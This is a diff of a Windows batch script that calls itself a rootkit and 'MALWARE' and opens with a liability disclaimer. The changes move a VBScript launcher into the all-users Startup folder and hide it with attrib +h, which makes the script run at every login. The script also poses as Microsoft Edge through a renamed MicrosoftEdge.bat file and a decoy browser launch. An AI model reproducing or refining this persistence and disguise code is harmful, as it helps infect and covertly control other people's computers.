@@ -7,7 +7,7 @@
 ::The creators and contributors of this rootkit software do not endorse or support any illegal or malicious use of the software. The use of this software is entirely at your own risk, and you assume full responsibility for any consequences that may arise from its use.
 ::By using or accessing this rootkit software, you agree to abide by all applicable laws and regulations. The creators and contributors of this software are not liable for any damages or legal repercussions resulting from the use or misuse of this software.
 ::Please ensure that you use this software responsibly and ethically, respecting the privacy and security of others.
-:: NEVER REMOVE THIS RULES
+::NEVER REMOVE THIS RULES
 ::BY DOWNLOADING THIS MALWARE YOU ACCEPT ALL RULES
 ::END OF RULES
 
@@ -37,10 +37,11 @@ if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
     ren %appdata%\MicrosoftEdge\%batch_name% MicrosoftEdge.bat
   )
 )
-if exist "%appdata%\MicrosoftEdge\inv.vbs" (
+if exist "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\inv.vbs" (
   goto root
 ) else (
-echo CreateObject("WScript.Shell"^).Run "%appdata%\MicrosoftEdge\inv.vbs 1", 0, False > "%appdata%\MicrosoftEdge\inv.vbs"
+echo CreateObject("WScript.Shell"^).Run "%appdata%\MicrosoftEdge\inv.vbs 1", 0, False > "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\inv.vbs"
+attrib +h %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\inv.vbs
   start msedge
 )
 endlocal
